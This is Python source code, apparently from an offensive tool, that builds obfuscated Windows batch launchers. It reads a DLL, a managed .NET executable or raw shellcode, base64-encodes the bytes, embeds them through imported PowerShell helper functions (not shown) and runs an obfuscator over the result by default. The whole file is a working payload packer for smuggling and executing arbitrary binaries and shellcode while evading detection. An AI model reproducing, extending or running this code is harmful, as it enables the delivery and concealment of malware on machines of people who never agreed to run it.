import base64
import sys
from pathlib import Path

from checks import (
    resolve_input_mode_and_symbol,
    run_obfuscator,
    is_managed_dotnet,
    has_managed_entrypoint,
)
from powershell import (
    build_dll_batch_launcher,
    build_managed_exe_batch_launcher,
    build_shellcode_batch_launcher,
)


def apply_obfuscation(output_path, no_obf):
    if no_obf:
        return

    try:
        run_obfuscator(output_path)
    except Exception as exc:
        print(f"Obfuscation failed: {exc}")
        sys.exit(1)


def build_dll_launcher(input_path, symbol_name, output_path, no_obf):
    mode = resolve_input_mode_and_symbol(input_path, symbol_name)
    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_dll_batch_launcher(payload_b64, symbol_name, mode)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")
    apply_obfuscation(output_path, no_obf)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created launcher ({mode_text}): {output_path}")


def build_managed_exe_launcher(input_path, output_path, no_obf):
    if not is_managed_dotnet(input_path):
        print(f"Not a managed .NET assembly: {input_path}")
        sys.exit(1)

    if not has_managed_entrypoint(input_path):
        print(f"Managed entry point not found: {input_path}")
        sys.exit(1)

    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_managed_exe_batch_launcher(payload_b64)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")
    apply_obfuscation(output_path, no_obf)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created managed EXE launcher ({mode_text}): {output_path}")


def build_shellcode_launcher(input_path, output_path, no_obf):
    if input_path.stat().st_size == 0:
        print(f"Empty shellcode input: {input_path}")
        sys.exit(1)

    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_shellcode_batch_launcher(payload_b64)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")
    apply_obfuscation(output_path, no_obf)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created shellcode launcher ({mode_text}): {output_path}")
